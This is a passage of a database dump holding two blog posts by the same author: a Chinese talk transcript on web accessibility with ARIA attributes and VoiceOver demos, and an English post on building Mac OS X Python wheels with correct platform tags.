(26, 'http://lepture.com/zh/2014/talk-on-accessibility-jsdc2014', '不被重視的 HTML：Accessibility', '<ul>\n<li>Slide: <a href="http://lab.lepture.com/jsdc-2014/slide.html">lab.lepture.com/jsdc-2014/slide.html</a></li>\n<li>Repo: <a href="https://github.com/lepture/jsdc-2014">github.com/lepture/jsdc-2014</a></li>\n</ul>\n<p>大家好，我今天談一點 Web 可訪問性的話題，主要是 HTML 相關的，與 JS 的關係並不是很大。</p>\n<p>（自我介紹略）</p>\n<p>那我要講可訪問性，當然是因爲它很重要，比如說它有經濟價值，因爲生活中有許多某種能力缺失的人。比如說有些國家的法律規定了，你必須實現 Web 的可訪問性。但是最重要的是，做爲開發者，你本來就應該做這些事。爲什麼呢？因爲這是標準規範，你所需要的只是遵循這些標準與規範而已。</p>\n<p>我們舉點現實生活中可訪問性的例子，比如捷運都有一個可容輪椅的入口，這方便殘疾人通過，比如說小便池有一個比較低，這方便小朋友。但是還有一些事情就不太如意了，比如說紅綠燈。我們看這樣一個交通燈，對紅綠色盲來說就沒有識別度了。</p>\n<p>我們看看色盲這一塊，這個圖片你們能看到上面是什麼數字麼？如果你看到的不是 74 的話，那你可能就是色盲了。那這一塊呢，其實在現實生活中是做得挺差的。參見中華民國《道路交通安全規則》第六十四條，對考駕照者有一項要求，即能辨別紅、黃、綠色，也就是說紅綠色盲是不能考駕照者。這當然可以理解，但是只要我們的紅綠燈稍微改變一下，比如給紅綠燈加上形狀，那紅綠色盲者不就能識別了麼。你要知道，全世界有大約 8% 的人是紅綠色盲呢。現實挺不公平的，要改變也需要花費更多的人力與時間。</p>\n<p>但是互聯網不一樣。互聯網意味着自由平等，它從一開始就是爲所有人設計的，所有人理應都能正常的使用互聯網。我們舉個好一點的例子。大家知道 Trello 吧，不知道也沒關係，它是一個項目管理工具。Trello 的個人設置裏有一個選項叫色盲友好(Color Blind Friendly)，開啓之後 label 的背景就是不純色了，比如你看這個綠色裏有斜線，這樣就不會和紅色的 label 混淆了。</p>\n<p>本來講這個話題，我是挺擔心的，怕是班門弄斧了。不過用了一下臺灣的一些公共服務網站後，發現這個擔心有點多餘了。我之前以爲只有大陸的這類網站難用，原來臺灣的也一樣嘛。</p>\n<p>可訪問性其實是一個很大的話題，它應該從設計之初就被重視起來，比如前面提到的 Trello 的例子，它是一個設計方面的實現。當我們談可訪問性時，不僅僅只是只視覺障礙者，也包括其它感觀有問題的人，比如說聽覺，甚至也包括所有感觀都正常的人。例如在現在的屏幕分辨率下，還有許多網站的文章正文字體大小居然是 12px，根本就看不清楚嘛，這也可以說是可訪問性差。關於閱讀性文字，我有寫一個 CSS 庫，<a href="http://lab.lepture.com/yue.css/">yue.css</a>，大家有興趣可以看看。</p>\n<p>在可訪問性這一塊，我們有些官方網站確實有在做。但是他們的做法都是錯的，基本相當於形象工程。比如說人民網，這個是大陸的一個官方媒體網站。他們專門爲盲人開設了專欄，就會有語音讀內容了。還有一些政府網站也是差不多，給你專門開設一個盲人用的網站，好像獻愛心一樣。但是他們的網站其實正常人用起來都很費勁啦。</p>\n<p>這種特殊對待的方案都是錯誤的做法，大家也不怎麼埋單。因爲並沒有什麼特殊的地方，Web 在設計時就已經考慮到這些問題了，也都有通用的解決方案。</p>\n<p>我們講可訪問性，這個話題的內容有點多，不會在這裏細講。我們單講點與前端，與寫代碼有點關係的。雖然這件事應該從設計之初就要考慮。</p>\n<p>所謂工與善其事，必先利其器。所謂知已知彼，百戰不怠。我們看看盲人上網用什麼，用讀屏軟件嘛。Mac 在這一塊做得就比較好，系統自帶的 Voice Over 挺好用的。Windows 我沒有怎麼用過，也沒聽人說用 Windows 自帶的工具，一般都是另外買的。因爲我是用 Mac 的，只需要了解一下 Voice Over 就夠了。</p>\n<p>那現在有 Mac 的同學們可以看看 Voice Over 怎麼用的，Command + F5 就可以開啓了。</p>\n<p>（演示 Voice Over）</p>\n<p>其實 Accessibility 的實踐是件很簡單的事，並不需要花多少時間與精力，只需要做一點點小改變就可以提高不少。</p>\n<p>那我們舉個很簡單的例子。許多網站都有用 icon font 來做圖標，很流行哦，看起來都很不錯的樣子。可是許多時候就忽略了可訪問性了。比如有的圖標，你根本就猜不出來它是什麼意思，這對視力正常的人來說都沒有可訪問性，你需要加個 tooltip 之類的來解釋一下。那我這裏的這個例子是一個齒輪圖標，大家都知道它是 settings 的意思啦，那對視力正常的人來說還好，但是假如你看不見的話，你根本就不知道它是個什麼東西。</p>\n<p>那我們給這個圖標一個很簡單的屬性（attribute）aria-label=“Settings”，我們來看看 demo。</p>\n<p>（使用 Voice Over 演示一下兩者的區別）</p>\n<p>上面這個例子是不是很簡單？我們現在就可以開始做出改變了。比如零時政府不是有一個萌典網站麼，我們看看萌典的網站，上面不是有很多 icon font 麼，大家可以給它加上 aria-label。</p>\n<p>我們再舉一個簡單的例子，Landmarks。</p>\n<p>這個也是個挺簡單的東西，內容也不多，就這麼幾個（見 slide），但是作用卻很大，使用 Voice Over 可以方便的跳轉。那我們來看一個例子，其實就是給相應的 block element 標上相應的 role 就好了。我們先看一下 Voice Over 的設置，需要它支持 Landmarks，把這個勾上就好了。那我們看這個 demo，我們開啓 Voice Over，Command + F5，然後用 Web Rotor 快速定位 landmarks，VO + U，也就是 Control + Option + U，那如果沒有出現 Landmarks 的選項的話，就按一下左右鍵。那這個時候就可以很方便的定位了，比如你看一篇文章，那就是在 main 區域裏，那你要跳轉頁面的話，就跳到 navigation 裏去咯。</p>\n<p>我們再演示一個 aria live region 的例子。我們看這個 demo，只需要打開 Voice Over 就好了，它會自己提示你有新訊息。如果沒有效果的話，檢查一下 Voice Over，看看是否打開了 live region 的支持。這個功能在 Twitter 的信息流裏有用到哦。</p>\n<p>但是要真的做好可訪問性，又是一件很困難的事。它的困難主要還是在複雜度上面，你需要考慮的東西太多了。那這裏舉一個 UI widget 方面的例子，tablist。我們簡單看一下它的 HTML 結構，這裏使用的 attributes 就多很多了，我們看到有 role，有 aria-selected，aria-controls 之類的。看起來會比較複雜。同時我們還要考慮正常的視覺效果，這裏有個小 tricks，我們把 aria-hidden=true 設置爲 display none，這樣讀屏軟體讀不到，視覺上也會看不到。</p>\n<p>（演示 tablist demo）</p>\n<p>那這樣一個小的 UI widget 看起來就有點麻煩了，那想想整個網站，是不是會更無從下手呢。</p>\n<p>除了複雜以外，還有一些歷史問題。比如說這個 aria-required 與 required。aria-required 是給讀屏軟體用的，required 是 HTML5 新加的特性。那我們應該用什麼呢！放在今天來看的就，當然是用 required 就可以了。這裏就會有一個可訪問性上的 attributes 與 HTML5 的重複，我會激進一點，傾向於只用 HTML5 的部分，其實大多數瀏覽器已經支持得挺好了。那我們來看一下 aria required 的 demo。</p>\n<p>(演示 aria-required demo）</p>\n<p>那你還可能需要考慮一下 keyboard binding，就是鍵盤快捷鍵。有些需要滑鼠操作的才能工作的地方，你可能就需要設計一些 key binding 来幫助别人使用。那對於盲人來說呢，使用鍵盤是比使用滑鼠要方便多了的。</p>\n<p>然後還有驗證碼，就是你註冊時經常會出現的那個東西。比如這個，這個是支付寶登錄時的驗證碼，它是個扭曲的字符，K8WM，我們也許看得清楚，但是如果看不到的話，那怎麼處理呢。這是我聽說的，據說有一個 QQ 羣，你把圖片 copy 一下，發到羣裏，然後會有視力正常的人告訴你這是個什麼東西，挺麻煩的吧。但是在臺灣就不用這麼麻煩了，你們知道 reCaptcha 這個項目吧，現在是 Google 的了。我們看一下 reCaptcha，它不僅有圖片，還是聲音驗證碼，就是這裏，你點這個地方就會有語音，那這樣看不到的人就可以用聽的了。這個服務挺方便的，但是在大陸就用不成，因爲被牆了嘛。但是臺灣沒有呀，如果大家自己有做網站，需要用到驗證碼的話，就儘量使用 reCaptcha，也比你自己寫一套 Captcha 要方便。</p>\n<p>那我說到提升可訪問性是件很簡單的事，也是件很困難的事。做一點點改變是很簡單的，比如之前說的給 icon font 加上 aria-label，真的挺簡單的。可是你要一口氣做得很完美的話，那幾乎就不可能了。我們一點一點改變，慢慢來，總是好的。不積跬步無以至千裏嘛。</p>\n<p>同時它也能幫你更好的組織整理你的 HTML 結構，能幫助搜索引擎更好的索引。它對你寫 HTML 有一定的指導意義。（略）</p>\n<p>最重要的還是我們開發者，身爲開發者應該有的驕傲。我們有能力去實現這些標準，那我們就會做咯，這是基本的職業素養。下面這些鏈接都是不錯的資源，大家可以都看看。</p>\n<p>謝謝。那我就講完了。</p>\n<p>哦。 One more thing，這個 slide 本身也是 accessible 的。</p>\n<p>（演示 slide 的可訪問性）</p>', '2014-11-06 23:42:49', 5, '2014-10-12 02:40:00', '2014-10-12 02:40:00', 0, '[["\\u6211\\u5011", 0.3721328405571984], ["\\u9019\\u500b", 0.2558413278830739], ["\\u4e00\\u500b", 0.22095387408083655], ["\\u554f\\u6027", 0.17443726901118675], ["\\u53ef\\u8a2a", 0.1395498152089494], ["aria", 0.12792066394153695], ["Over", 0.1162915126741245], ["Voice", 0.1162915126741245], ["\\u7db2\\u7ad9", 0.1162915126741245], ["\\u7c21\\u55ae", 0.1162915126741245], ["\\u4ec0\\u9ebc", 0.0930332101392996], ["\\u6bd4\\u5982", 0.09121984915548638], ["required", 0.08140405887188715], ["\\u8272\\u76f2", 0.07360646536011674], ["\\u5176\\u5be6", 0.0697749076044747], ["\\u6539\\u8b8a", 0.0697749076044747], ["demo", 0.0697749076044747], ["\\u4f8b\\u5b50", 0.06893127193307393], ["\\u4e00\\u4e0b", 0.06182936756231517], ["\\u8a2d\\u8a08", 0.05814575633706225]]', NULL, NULL, '\nSlide: lab.lepture.com/jsdc-2014/slide.html\nRepo: github.com/lepture/jsdc-2014\n\n大家好，我今天談一點 Web 可訪問性的話題，主要是 HTML 相關的，與 JS 的關係並不是很大。\n（自我介紹略）\n那我要講可訪問性，當然是因爲它很重要，比如說它有經濟價值，因爲生活中有許多某種能力缺失的人。比如說有些國家的法律規定了，你必須實現 Web 的可訪問性。但是最重要的是，做爲開發者，你本來就應該做這些事。爲什麼呢？因爲這是標準規範，你所需要的只是遵循這些標準與規範而已。\n我們舉點現實生活中可訪問性的例子，比如捷運都有一個可容輪椅的入口，這方便殘疾人通過，比如說小便池有一個比較低，這方便小朋友。但是還有一些事情就不太如意了，比如說紅綠燈。我們看這樣一個交通燈，對紅綠色盲來說就沒有識別度了。\n我們看看色盲這一塊，這個圖片你們能看到上面是什麼數字麼？如果你看到的不是 74 的話，那你可能就是色盲了。那這一塊呢，其實在現實生活中是做得挺差的。參見中華民國《道路交通安全規則》第六十四條，對考駕照者有一項要求，即能辨別紅、黃、綠色，也就是說紅綠色盲是不能考駕照者。這當然可以理解，但是只要我們的紅綠燈稍微改變一下，比如給紅綠燈加上形狀，那紅綠色盲者不就能識別了麼。你要知道，全世界有大約 8% 的人是紅綠色盲呢。現實挺不公平的，要改變也需要花費更多的人力與時間。\n但是互聯網不一樣。互聯網意味着自由平等，它從一開始就是爲所有人設計的，所有人理應都能正常的使用互聯網。我們舉個好一點的例子。大家知道 Trello 吧，不知道也沒關係，它是一個項目管理工具。Trello 的個人設置裏有一個選項叫色盲友好(Color Blind Friendly)，開啓之後 label 的背景就是不純色了，比如你看這個綠色裏有斜線，這樣就不會和紅色的 label 混淆了。\n本來講這個話題，我是挺擔心的，怕是班門弄斧了。不過用了一下臺灣的一些公共服務網站後，發現這個擔心有點多餘了。我之前以爲只有大陸的這類網站難用，原來臺灣的也一樣嘛。\n可訪問性其實是一個很大的話題，它應該從設計之初就被重視起來，比如前面提到的 Trello 的例子，它是一個設計方面的實現。當我們談可訪問性時，不僅僅只是只視覺障礙者，也包括其它感觀有問題的人，比如說聽覺，甚至也包括所有感觀都正常的人。例如在現在的屏幕分辨率下，還有許多網站的文章正文字體大小居然是 12px，根本就看不清楚嘛，這也可以說是可訪問性差。關於閱讀性文字，我有寫一個 CSS 庫，yue.css，大家有興趣可以看看。\n在可訪問性這一塊，我們有些官方網站確實有在做。但是他們的做法都是錯的，基本相當於形象工程。比如說人民網，這個是大陸的一個官方媒體網站。他們專門爲盲人開設了專欄，就會有語音讀內容了。還有一些政府網站也是差不多，給你專門開設一個盲人用的網站，好像獻愛心一樣。但是他們的網站其實正常人用起來都很費勁啦。\n這種特殊對待的方案都是錯誤的做法，大家也不怎麼埋單。因爲並沒有什麼特殊的地方，Web 在設計時就已經考慮到這些問題了，也都有通用的解決方案。\n我們講可訪問性，這個話題的內容有點多，不會在這裏細講。我們單講點與前端，與寫代碼有點關係的。雖然這件事應該從設計之初就要考慮。\n所謂工與善其事，必先利其器。所謂知已知彼，百戰不怠。我們看看盲人上網用什麼，用讀屏軟件嘛。Mac 在這一塊做得就比較好，系統自帶的 Voice Over 挺好用的。Windows 我沒有怎麼用過，也沒聽人說用 Windows 自帶的工具，一般都是另外買的。因爲我是用 Mac 的，只需要了解一下 Voice Over 就夠了。\n那現在有 Mac 的同學們可以看看 Voice Over 怎麼用的，Command + F5 就可以開啓了。\n（演示 Voice Over）\n其實 Accessibility 的實踐是件很簡單的事，並不需要花多少時間與精力，只需要做一點點小改變就可以提高不少。\n那我們舉個很簡單的例子。許多網站都有用 icon font 來做圖標，很流行哦，看起來都很不錯的樣子。可是許多時候就忽略了可訪問性了。比如有的圖標，你根本就猜不出來它是什麼意思，這對視力正常的人來說都沒有可訪問性，你需要加個 tooltip 之類的來解釋一下。那我這裏的這個例子是一個齒輪圖標，大家都知道它是 settings 的意思啦，那對視力正常的人來說還好，但是假如你看不見的話，你根本就不知道它是個什麼東西。\n那我們給這個圖標一個很簡單的屬性（attribute）aria-label=“Settings”，我們來看看 demo。\n（使用 Voice Over 演示一下兩者的區別）\n上面這個例子是不是很簡單？我們現在就可以開始做出改變了。比如零時政府不是有一個萌典網站麼，我們看看萌典的網站，上面不是有很多 icon font 麼，大家可以給它加上 aria-label。\n我們再舉一個簡單的例子，Landmarks。\n這個也是個挺簡單的東西，內容也不多，就這麼幾個（見 slide），但是作用卻很大，使用 Voice Over 可以方便的跳轉。那我們來看一個例子，其實就是給相應的 block element 標上相應的 role 就好了。我們先看一下 Voice Over 的設置，需要它支持 Landmarks，把這個勾上就好了。那我們看這個 demo，我們開啓 Voice Over，Command + F5，然後用 Web Rotor 快速定位 landmarks，VO + U，也就是 Control + Option + U，那如果沒有出現 Landmarks 的選項的話，就按一下左右鍵。那這個時候就可以很方便的定位了，比如你看一篇文章，那就是在 main 區域裏，那你要跳轉頁面的話，就跳到 navigation 裏去咯。\n我們再演示一個 aria live region 的例子。我們看這個 demo，只需要打開 Voice Over 就好了，它會自己提示你有新訊息。如果沒有效果的話，檢查一下 Voice Over，看看是否打開了 live region 的支持。這個功能在 Twitter 的信息流裏有用到哦。\n但是要真的做好可訪問性，又是一件很困難的事。它的困難主要還是在複雜度上面，你需要考慮的東西太多了。那這裏舉一個 UI widget 方面的例子，tablist。我們簡單看一下它的 HTML 結構，這裏使用的 attributes 就多很多了，我們看到有 role，有 aria-selected，aria-controls 之類的。看起來會比較複雜。同時我們還要考慮正常的視覺效果，這裏有個小 tricks，我們把 aria-hidden=true 設置爲 display none，這樣讀屏軟體讀不到，視覺上也會看不到。\n（演示 tablist demo）\n那這樣一個小的 UI widget 看起來就有點麻煩了，那想想整個網站，是不是會更無從下手呢。\n除了複雜以外，還有一些歷史問題。比如說這個 aria-required 與 required。aria-required 是給讀屏軟體用的，required 是 HTML5 新加的特性。那我們應該用什麼呢！放在今天來看的就，當然是用 required 就可以了。這裏就會有一個可訪問性上的 attributes 與 HTML5 的重複，我會激進一點，傾向於只用 HTML5 的部分，其實大多數瀏覽器已經支持得挺好了。那我們來看一下 aria required 的 demo。\n(演示 aria-required demo）\n那你還可能需要考慮一下 keyboard binding，就是鍵盤快捷鍵。有些需要滑鼠操作的才能工作的地方，你可能就需要設計一些 key binding 来幫助别人使用。那對於盲人來說呢，使用鍵盤是比使用滑鼠要方便多了的。\n然後還有驗證碼，就是你註冊時經常會出現的那個東西。比如這個，這個是支付寶登錄時的驗證碼，它是個扭曲的字符，K8WM，我們也許看得清楚，但是如果看不到的話，那怎麼處理呢。這是我聽說的，據說有一個 QQ 羣，你把圖片 copy 一下，發到羣裏，然後會有視力正常的人告訴你這是個什麼東西，挺麻煩的吧。但是在臺灣就不用這麼麻煩了，你們知道 reCaptcha 這個項目吧，現在是 Google 的了。我們看一下 reCaptcha，它不僅有圖片，還是聲音驗證碼，就是這裏，你點這個地方就會有語音，那這樣看不到的人就可以用聽的了。這個服務挺方便的，但是在大陸就用不成，因爲被牆了嘛。但是臺灣沒有呀，如果大家自己有做網站，需要用到驗證碼的話，就儘量使用 reCaptcha，也比你自己寫一套 Captcha 要方便。\n那我說到提升可訪問性是件很簡單的事，也是件很困難的事。做一點點改變是很簡單的，比如之前說的給 icon font 加上 aria-label，真的挺簡單的。可是你要一口氣做得很完美的話，那幾乎就不可能了。我們一點一點改變，慢慢來，總是好的。不積跬步無以至千裏嘛。\n同時它也能幫你更好的組織整理你的 HTML 結構，能幫助搜索引擎更好的索引。它對你寫 HTML 有一定的指導意義。（略）\n最重要的還是我們開發者，身爲開發者應該有的驕傲。我們有能力去實現這些標準，那我們就會做咯，這是基本的職業素養。下面這些鏈接都是不錯的資源，大家可以都看看。\n謝謝。那我就講完了。\n哦。 One more thing，這個 slide 本身也是 accessible 的。\n（演示 slide 的可訪問性）', NULL, NULL, NULL),
(27, 'http://lepture.com/en/2014/python-on-a-hard-wheel', 'Python on A Hard Wheel', '<p>Wheel is a distribution file format for Python, which was introduced a few\nyears ago with <a href="http://legacy.python.org/dev/peps/pep-0427/">PEP427</a>. In\ncase you have no knowledge about wheel, you should read the PEP. If you are\na fan of Armin Ronacher, you might like to read <a href="http://lucumr.pocoo.org/2014/1/27/python-on-wheels/">Python on Wheels</a>.</p>\n<p>The wheel format is designed as a binary package format. I had never tried\n<code>bdist_rpm</code>, because I don''t use Red Hat based systems. I had never tried\neggs, which I believe belongs to the old world. Actually, I had never tried\nto upload any binary package to PyPI. When I publish a libary, I publish it\nas a source package.</p>\n<p>I had <a href="https://github.com/lepture/mistune/issues/3">a try on wheel</a> recently.\nIt wasn''t a pleasant experience. It takes me too much time to create the\npowerful format for a binary library:</p>\n<pre><code>macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.whl</code></pre>\n<p>If you take a look at <a href="https://pypi.python.org/pypi/Cython">Cython PyPI</a>,\nyou would find the wheels end with this format. But you can''t simply build\nthe wheel yourself.</p>\n<hr />\n<p>PyPI currently only allows uploading platform-specific wheels for Windows\nand Mac OS X. Linux is not included. But it is still useful to create\nwheels for these platforms, better than nothing.</p>\n<p>For pure Python, a wheel would be something like:</p>\n<pre><code class="lang-bash"># python setup.py bdist_wheel --universal\nmistune-0.4-py2.py3-none-any.whl</code></pre>\n<p>Building wheels for pure Python is easy. Building binary wheels for all Mac\nOSX is not. At the very first, I created wheels for <a href="https://github.com/lepture/mistune">mistune</a>:</p>\n<pre><code>mistune-0.4-cp27-none-macosx_10_4_x86_64.whl</code></pre>\n<p>It is good. But I''ve seen the wheel for Cython, Pandas and Numpy. They all\nend with the complex filename. WTF. Did I miss something? The PEP describes\nthe file name format as:</p>\n<pre><code>{distribution}-{version}(-{build tag})?-{python tag}-{abi tag}-{platform tag}.whl</code></pre>\n<p>The different ending is platform tag:</p>\n<ol>\n<li><code>mistune</code> is the distribution name</li>\n<li><code>0.4</code> is package version</li>\n<li><code>cp27</code> is python tag</li>\n<li><code>none</code> is ABI tag</li>\n<li><code>macosx_10_4_x86_64</code> is platform tag</li>\n</ol>\n<p>I''ve read the source code of <code>bdist_wheel.py</code>, it turned out that the platform tag\nwas generated by <code>distutils.util.get_platform()</code>. Why is my platform tag <code>macosx_10_4_x86_64</code>?\nWhy can''t I build a <code>macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.whl</code>?\nI''ve googled a lot. The result was not good enough. After all, I''ve found what I need,\n<a href="https://github.com/MacPython/wiki/wiki/Spinning-wheels">Spinning wheels</a>. In this\nvery wiki, I''ve learnt the popular Pythons and their platform tags.</p>\n<table>\n<thead><tr>\n<th>Python source</th>\n<th>Python version</th>\n<th>OSX version</th>\n<th><code>get_platform()</code></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Python.org</td>\n<td>2.7</td>\n<td>10.9</td>\n<td>macosx-10.6-intel</td>\n</tr>\n<tr>\n<td>System Python</td>\n<td>2.7</td>\n<td>10.9</td>\n<td>macosx-10.9-intel</td>\n</tr>\n<tr>\n<td>Macports</td>\n<td>2.7</td>\n<td>10.9</td>\n<td>macosx-10.9-x86_64</td>\n</tr>\n<tr>\n<td>Homebrew</td>\n<td>2.7</td>\n<td>10.9</td>\n<td>macosx-10.9-x86_64</td>\n</tr>\n<tr>\n<td>Python.org</td>\n<td>3.4</td>\n<td>10.9</td>\n<td>macosx-10.6-intel</td>\n</tr>\n<tr>\n<td>Python.org</td>\n<td>2.7</td>\n<td>10.7</td>\n<td>macosx-10.6-intel</td>\n</tr>\n<tr>\n<td>System Python</td>\n<td>2.7</td>\n<td>10.7</td>\n<td>macosx-10.7-intel</td>\n</tr>\n</tbody>\n</table>\n<p>My platform tag is not in the table, because I was using the Python created by\n<a href="https://github.com/yyuu/pyenv">pyenv</a>. When I tried the System Python, the\nwheel turned out:</p>\n<pre><code>mistune-0.4-cp27-none-macosx_10_9_intel.whl</code></pre>\n<p>In the wiki of <a href="https://github.com/MacPython/wiki/wiki/Spinning-wheels">Spinning wheels</a>,\nI''ve learnt the very important idea, a <code>macosx_10_6_intel</code> would be compatible\nwith <code>macosx_10_9_intel</code> and <code>macosx_10_9_x86_64</code>. In this case, you can simply\nrename the filename from <code>macosx_10_6_intel</code> to:</p>\n<pre><code>macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64</code></pre>\n<blockquote><p>Because having a fat binary includes having x86_64, so is compatible with\nx86_64-only builds. Stuff compiled with the 10.6 SDK should also be\ncompatible with stuff built against later SDK versions\n(up to and including 10.9). </p>\n</blockquote><p>In the wiki <a href="https://github.com/MacPython/wiki/wiki/Wheel-building">MacPython OSX wheel building</a>,\na Travis CI approach is teached to you. You can build the idea wheel with\nTravis CI, which is exactly the way <a href="https://github.com/MacPython/pandas-wheels">pandas</a>\nand <a href="https://github.com/MacPython/numpy-wheels">numpy</a> are using.</p>\n<hr />\n<p>But what if I want to build the wheels on my own machine? All I need is a\nPython with platform <code>macosx_10_6_intel</code>. But why did pyenv create the python\nwith platform tag <code>macosx_10_4_x86_64</code>?</p>\n<p>The source code of pythonz tells me that <code>macosx_10_4</code> is defined by environ\nvariable <code>MACOSX_DEPLOYMENT_TARGET</code>, and <code>intel</code> can be created by configure\noptions <code>--enable-universalsdk=/ --with-universal-archs=intel</code> when building\nPython. Since I''ve switched to pyenv, it would be done with the shell profile:</p>\n<pre><code class="lang-bash"># bash and zsh\nexport MACOSX_DEPLOYMENT_TARGET=&quot;10.6&quot;\nexport PYTHON_CONFIGURE_OPTS=&quot;--enable-universalsdk=/ --with-universal-archs=intel&quot;</code></pre>\n<p>Installing python with pyenv:</p>\n<pre><code>$ pyenv install 2.7.8</code></pre>\n<p>The compiled python would be <code>macosx_10_6_intel</code> now. Check the platform tag:</p>\n<pre><code class="lang-python">&gt;&gt;&gt; import distutils.util\n&gt;&gt;&gt; print(distutils.util.get_platform())\nmacosx-10.6-intel</code></pre>\n<p>You can install as many pythons as you like, such as 3.3.5 and 3.4.1, so that\nyou can create wheels for Python 3.3 and Python 3.4.</p>\n<hr />\n<p>The final patch for <code>setup.py</code> would make it easy to create powerful Mac\nwheels:</p>\n<pre><code class="lang-python">try:\n    from wheel.bdist_wheel import bdist_wheel\n\n    class _bdist_wheel(bdist_wheel):\n        def get_tag(self):\n            tag = bdist_wheel.get_tag(self)\n            repl = ''macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64''\n            if tag[2] == ''macosx_10_6_intel'':\n                tag = (tag[0], tag[1], repl)\n            return tag\n\n    cmdclass = {''bdist_wheel'': _bdist_wheel}\nexcept ImportError:\n    cmdclass = {}\n\nsetup(\n    # ...\n    cmdclass=cmdclass,\n    # ...\n)</code></pre>\n<p>I would suggest that you use this patch for binary wheel. A simple renaming\nis not as good as this one patch. This patch would change the platform tag,\nand write the information to the wheel meta:</p>\n<pre><code># file: mistune-0.4.dist-info/WHEEL\nWheel-Version: 1.0\nGenerator: bdist_wheel (0.24.0)\nRoot-Is-Purelib: false\nTag: cp27-none-macosx_10_6_intel\nTag: cp27-none-macosx_10_9_intel\nTag: cp27-none-macosx_10_9_x86_64</code></pre>\n<p>But a simple renaming would not add those tags to wheel meta. If you dare\nhave a look at pandas wheel meta:</p>\n<pre><code># file: pandas-0.14.1.dist-info/WHEEL\nWheel-Version: 1.0\nGenerator: bdist_wheel (0.24.0)\nRoot-Is-Purelib: false\nTag: cp27-none-macosx_10_6_intel</code></pre>\n<p>It has no tag for <code>macosx_10_9_intel</code> and <code>macosx_10_9_x86_64</code>.</p>\n<p>This is how I created <a href="https://pypi.python.org/pypi/mistune">wheels for mistune</a>.\nI''d try windows later (or never).</p>\n<pre><code class="lang-bash">$ python setup.py bdist_wheel upload</code></pre>', '2014-11-06 23:42:49', 5, '2014-08-19 08:00:00', '2014-08-19 08:00:00', 0, '[["macosx", 0.6175310365736423], ["10", 0.49085800343033104], ["intel", 0.44335561600158935], ["wheel", 0.41168735771576154], ["tag", 0.3641849702870198], ["Python", 0.2691801954295364], ["64", 0.23751193714370858], ["platform", 0.23751193714370858], ["x86", 0.23751193714370858], ["bdist", 0.20584367885788077], ["wheels", 0.19000954971496686], ["10.9", 0.14250716228622515], ["would", 0.14250716228622515], ["none", 0.12667303314331124], ["2.7", 0.11083890400039734], ["mistune", 0.11083890400039734], ["cp27", 0.11083890400039734], ["ve", 0.11083890400039734], ["python", 0.11083890400039734], ["10.6", 0.09500477485748343]]', NULL, NULL, 'Wheel is a distribution file format for Python, which was introduced a few\nyears ago with PEP427. In\ncase you have no knowledge about wheel, you should read the PEP. If you are\na fan of Armin Ronacher, you might like to read Python on Wheels.\nThe wheel format is designed as a binary package format. I had never tried\nbdist_rpm, because I don''t use Red Hat based systems. I had never tried\neggs, which I believe belongs to the old world. Actually, I had never tried\nto upload any binary package to PyPI. When I publish a libary, I publish it\nas a source package.\nI had a try on wheel recently.\nIt wasn''t a pleasant experience. It takes me too much time to create the\npowerful format for a binary library:\nmacosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.whl\nIf you take a look at Cython PyPI,\nyou would find the wheels end with this format. But you can''t simply build\nthe wheel yourself.\n\nPyPI currently only allows uploading platform-specific wheels for Windows\nand Mac OS X. Linux is not included. But it is still useful to create\nwheels for these platforms, better than nothing.\nFor pure Python, a wheel would be something like:\n# python setup.py bdist_wheel --universal\nmistune-0.4-py2.py3-none-any.whl\nBuilding wheels for pure Python is easy. Building binary wheels for all Mac\nOSX is not. At the very first, I created wheels for mistune:\nmistune-0.4-cp27-none-macosx_10_4_x86_64.whl\nIt is good. But I''ve seen the wheel for Cython, Pandas and Numpy. They all\nend with the complex filename. WTF. Did I miss something? The PEP describes\nthe file name format as:\n{distribution}-{version}(-{build tag})?-{python tag}-{abi tag}-{platform tag}.whl\nThe different ending is platform tag:\n\nmistune is the distribution name\n0.4 is package version\ncp27 is python tag\nnone is ABI tag\nmacosx_10_4_x86_64 is platform tag\n\nI''ve read the source code of bdist_wheel.py, it turned out that the platform tag\nwas generated by distutils.util.get_platform(). Why is my platform tag macosx_10_4_x86_64?\nWhy can''t I build a macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.whl?\nI''ve googled a lot. The result was not good enough. After all, I''ve found what I need,\nSpinning wheels. In this\nvery wiki, I''ve learnt the popular Pythons and their platform tags.\n\n\nPython source\nPython version\nOSX version\nget_platform()\n\n\n\n\nPython.org\n2.7\n10.9\nmacosx-10.6-intel\n\n\nSystem Python\n2.7\n10.9\nmacosx-10.9-intel\n\n\nMacports\n2.7\n10.9\nmacosx-10.9-x86_64\n\n\nHomebrew\n2.7\n10.9\nmacosx-10.9-x86_64\n\n\nPython.org\n3.4\n10.9\nmacosx-10.6-intel\n\n\nPython.org\n2.7\n10.7\nmacosx-10.6-intel\n\n\nSystem Python\n2.7\n10.7\nmacosx-10.7-intel\n\n\n\nMy platform tag is not in the table, because I was using the Python created by\npyenv. When I tried the System Python, the\nwheel turned out:\nmistune-0.4-cp27-none-macosx_10_9_intel.whl\nIn the wiki of Spinning wheels,\nI''ve learnt the very important idea, a macosx_10_6_intel would be compatible\nwith macosx_10_9_intel and macosx_10_9_x86_64. In this case, you can simply\nrename the filename from macosx_10_6_intel to:\nmacosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64\nBecause having a fat binary includes having x86_64, so is compatible with\nx86_64-only builds. Stuff compiled with the 10.6 SDK should also be\ncompatible with stuff built against later SDK versions\n(up to and including 10.9). \nIn the wiki MacPython OSX wheel building,\na Travis CI approach is teached to you. You can build the idea wheel with\nTravis CI, which is exactly the way pandas\nand numpy are using.\n\nBut what if I want to build the wheels on my own machine? All I need is a\nPython with platform macosx_10_6_intel. But why did pyenv create the python\nwith platform tag macosx_10_4_x86_64?\nThe source code of pythonz tells me that macosx_10_4 is defined by environ\nvariable MACOSX_DEPLOYMENT_TARGET, and intel can be created by configure\noptions --enable-universalsdk=/ --with-universal-archs=intel when building\nPython. Since I''ve switched to pyenv, it would be done with the shell profile:\n# bash and zsh\nexport MACOSX_DEPLOYMENT_TARGET="10.6"\nexport PYTHON_CONFIGURE_OPTS="--enable-universalsdk=/ --with-universal-archs=intel"\nInstalling python with pyenv:\n$ pyenv install 2.7.8\nThe compiled python would be macosx_10_6_intel now. Check the platform tag:\n>>> import distutils.util\n>>> 